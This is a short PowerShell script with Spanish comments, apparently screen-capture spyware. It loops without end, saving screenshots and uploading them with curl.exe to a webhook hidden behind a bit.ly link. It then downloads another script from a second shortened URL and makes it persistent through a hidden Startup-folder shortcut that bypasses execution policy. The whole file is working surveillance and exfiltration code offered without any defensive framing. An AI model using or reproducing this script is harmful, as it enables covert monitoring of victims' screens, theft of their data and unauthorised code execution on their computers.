$hookurl = "https://bit.ly/chu_kbras"
$seconds = 30 # Intervalo entre capturas
$maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script

# Detección de URL acortada
if ($hookurl.Length -ne 121) {
    Write-Host "Shortened Webhook URL Detected..."
    $hookurl = (irm $hookurl).url
}

do {
    $Filett = "$env:temp\SC.png"
    
    # Verificar si el archivo ya existe antes de crear uno nuevo
    if (-not (Test-Path $Filett)) {
        Add-Type -AssemblyName System.Windows.Forms
        Add-type -AssemblyName System.Drawing
        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    }
    
    Start-Sleep 1
    
    # Verificar si la variable $hookurl está definida antes de utilizarla
    if (-not $hookurl) {
        Write-Host "La variable hookurl no está definida."
        exit
    }

    # Verificar si la variable $Filett está definida antes de utilizarla
    if (-not $Filett) {
        Write-Host "La variable Filett no está definida."
        exit
    }

    curl.exe -F "file1=@$Filett" $hookurl
    Start-Sleep 1
    Remove-Item -Path $Filett
    Start-Sleep $seconds

    # Verificar si se ha alcanzado la cantidad máxima de imágenes
    if ($a -eq $maxImages) {
        # Descargar el script principal
        $syswUrl = "https://bit.ly/Screen_dc"
        $syswPath = "$env:USERPROFILE\sysw.ps1"
        Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
        
        # Crear acceso directo en la carpeta de inicio del usuario
        $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($shortcutLocation)
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`""
        $shortcut.Save()
        
        # Reiniciar contador de imágenes
        $a = 0
    }
} while ($true)